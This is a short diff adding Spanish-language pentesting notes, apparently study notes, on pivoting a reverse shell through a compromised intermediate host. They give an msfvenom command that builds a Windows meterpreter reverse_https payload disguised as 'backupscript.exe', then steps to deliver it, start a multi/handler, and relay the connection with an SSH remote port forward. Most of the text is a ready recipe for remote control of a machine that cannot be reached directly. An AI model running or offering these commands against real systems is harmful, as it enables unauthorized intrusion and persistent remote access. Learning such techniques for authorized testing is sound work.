@@ -1,0 +1,12 @@
+Si necesitamos crear una shell reversa desde un host al que no llegamos directamente debemos crear el payload apuntando al servidor intermedio que tenemos comprometido:
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+
+hacemos llegar el archivo malicioso a la máquina objetivo.
+
+levantamos un multi/handler
+
+luego hacemos un remote port forwarding para recibir la conexión establecida entre el target y el servidor intermedio:
+
+ssh -R <IP_subred_no_alcanzable>:<puerto_donde_se_genera_la_conección>:0.0.0.0:<puerto_multi_handler> ubuntu@<ipAddressofTarget> -vN
+
+ejecutamos el archivo malicioso y esperamos la conección en el multihandler.
